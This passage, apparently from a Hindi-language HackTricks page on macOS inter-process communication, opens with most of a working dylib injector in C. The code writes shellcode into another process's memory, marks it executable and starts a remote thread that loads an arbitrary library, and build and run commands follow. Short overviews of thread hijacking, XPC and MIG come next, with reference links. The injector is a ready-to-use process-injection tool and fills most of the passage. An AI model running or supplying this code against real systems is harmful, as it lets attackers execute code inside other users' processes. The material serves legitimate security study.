if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### धागा हाइजैकिंग के माध्यम से टास्क पोर्ट के माध्यम से <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

इस तकनीक में प्रक्रिया का एक धागा हाइजैक किया जाता है:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### मौलिक जानकारी

XPC, जिसका मतलब है XNU (macOS द्वारा उपयोग किया जाने वाला कर्नेल) इंटर-प्रोसेस कम्युनिकेशन, macOS और iOS पर प्रक्रियाओं के बीच **संचार** के लिए एक फ्रेमवर्क है। XPC विभिन्न प्रक्रियाओं के बीच **सुरक्षित, असिंक्रोनस मेथड कॉल** करने के लिए एक तंत्र प्रदान करता है। यह Apple की सुरक्षा परिदृश्य का एक हिस्सा है, जो **विशेषाधिकार से अलग अनुप्रयोग** की सृजना की अनुमति देता है जहाँ प्रत्येक **घटक** केवल उन अनुमतियों के साथ चलता है जो उसके काम के लिए आवश्यक हैं, इससे किसी संक्रमित प्रक्रिया से होने वाले संभावित हानि को सीमित किया जाता है।

इस **संचार** के काम करने के बारे में अधिक जानकारी के लिए यहाँ जांचें:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - मैक इंटरफेस जेनरेटर

MIG को **मैक IPC** कोड निर्माण की प्रक्रिया को सरल बनाने के लिए बनाया गया था। यह मूल रूप से एक विशिष्ट परिभाषा के साथ सर्वर और क्लाइंट के बीच संचार के लिए आवश्यक कोड उत्पन्न करता है। यदी उत्पन्न कोड बेहद बदसूरत हो, तो एक डेवलपर को उसे आयात करने की आवश्यकता होगी और उसका कोड पहले की तुलना में बहुत सरल होगा।

अधिक जानकारी के लिए यहाँ जांचें:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## संदर्भ

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का विज्ञापन HackTricks में देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) पर **फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
